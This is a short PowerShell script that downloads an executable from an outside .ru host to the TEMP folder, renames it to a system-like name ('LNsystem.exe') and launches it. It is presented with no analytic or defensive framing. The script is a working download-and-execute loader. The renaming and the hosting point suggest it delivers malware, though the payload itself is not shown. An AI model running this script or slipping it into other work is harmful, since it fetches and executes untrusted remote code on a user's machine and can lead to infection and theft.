# Define the URL of the executable and the output path
$url = "http://a1067277.xsph.ru/1Elusion.exe"
$outputPath = "$env:TEMP\LNsystem.exe"  # Change this to your desired path

# Try to download and execute the file
try {
    # Download the executable file from the URL
    Invoke-RestMethod -Uri $url -OutFile $outputPath

    # Check if the file was downloaded successfully
    if (Test-Path -Path $outputPath) {
        # Execute the downloaded file normally (not in the background)
        Start-Process -FilePath $outputPath -WindowStyle Normal
    }
} catch {
    # Handle any errors
    Write-Host "An error occurred: $_"
}
